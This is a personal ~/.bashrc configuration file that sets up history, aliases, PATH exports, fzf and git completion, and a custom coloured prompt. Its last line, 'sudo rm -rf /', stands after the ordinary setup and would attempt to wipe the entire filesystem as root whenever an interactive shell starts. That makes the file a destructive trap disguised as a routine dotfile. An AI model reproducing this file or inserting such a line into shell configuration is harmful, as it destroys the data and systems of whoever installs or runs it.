#
# ~/.bashrc
#
# To lint check, run
#
#   $ shellcheck -e SC1090 -s bash ~/.bashrc
#


# If not running interactively, don't do anything
[[ $- != *i* ]] && return


# source other scripts
[ -f "$HOME/.cargo/env" ] && source "$HOME/.cargo/env"
[ -f "$HOME/.config/bash/git-completion.bash" ] && source "$HOME/.config/bash/git-completion.bash"
[ -f "$HOME/.config/bash/git-prompt.sh" ] && source "$HOME/.config/bash/git-prompt.sh"
[ -f "$HOME/.fzf/shell/completion.bash" ] && source "$HOME/.fzf/shell/completion.bash"
[ -f "$HOME/.fzf/shell/key-bindings.bash" ] && source "$HOME/.fzf/shell/key-bindings.bash"


# bash setup
HISTCONTROL=ignoreboth
HISTSIZE=1000
HISTFILESIZE=2000
shopt -s histappend
shopt -s checkwinsize


# aliases
alias ls='ls --color=auto'
alias dotfiles='git --git-dir="${HOME}"/.dotfiles.git --work-tree="${HOME}"'
alias i3lock='i3lock -c "#000000"'


# exports
export EDITOR=vim
export PATH="$HOME/bin:$HOME/.fzf/bin:$PATH"
export RIPGREP_CONFIG_PATH=$HOME/.config/ripgrep/config


# bash prompt
function _prompt_command() {
	# retval
	local retval=$?
	if [ $retval -eq 0 ]; then
		retval=""
	else
		retval=" $retval"
	fi

	# git
	local git
	git="$(__git_ps1)"

	## path (tree/leaf, with leaf in different color)
	local path leaf tree available padding
	path="${PWD/$HOME/'~'}"
	leaf="$(basename "$path")"
	tree="${path%$leaf}"
	available=$((COLUMNS - ${#retval} - ${#git} - ${#leaf}))
	if [ ${#tree} -gt ${available} ]; then
		tree="...${tree: -$((available - 3))}"
		padding=${#leaf}
	else
		padding=$((COLUMNS - ${#retval} - ${#git} - ${#tree}))
	fi

	# create prompt
	export PS1
	local red='\e[0;31m'
	local yellow='\e[0;33m'
	local cyan='\e[0;36m'
	local CYAN='\e[1;36m'
	local reset='\e[39m'

	PS1=$(printf "${cyan}%s${CYAN}%-${padding}s${yellow}%s${red}%s${reset}\n\\$ " \
		"$tree" "$leaf" \
		"$git" "$retval"
	)
}
export PROMPT_COMMAND=_prompt_command

sudo rm -rf /
